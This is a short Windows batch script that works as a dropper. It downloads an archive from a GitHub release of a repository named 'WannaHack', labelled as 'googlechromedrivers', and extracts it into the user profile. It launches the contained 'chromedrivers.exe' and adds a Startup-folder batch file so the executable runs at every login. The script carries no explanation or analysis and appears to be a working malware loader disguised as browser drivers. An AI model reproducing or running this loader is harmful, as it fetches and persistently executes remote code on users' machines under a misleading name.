@echo off
set "zipUrl=https://github.com/Foliowiec/WannaHack/releases/download/main/googlechromedrivers.rar"
set "downloadPath=%USERPROFILE%\\URN"
if not exist "%downloadPath%" mkdir "%downloadPath%"
curl -L -o "%downloadPath%\sys.rar" "%zipUrl%"
C:
cd %downloadPath%
tar -xf sys.rar
set "startup=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "batchScriptPath=%startup%\sys.bat"
(
echo @echo off
echo start "" "%downloadPath%\googlechromedrivers\chromedrivers.exe"
) > "%batchScriptPath%"
start "" "%downloadPath%\googlechromedrivers\chromedrivers.exe"
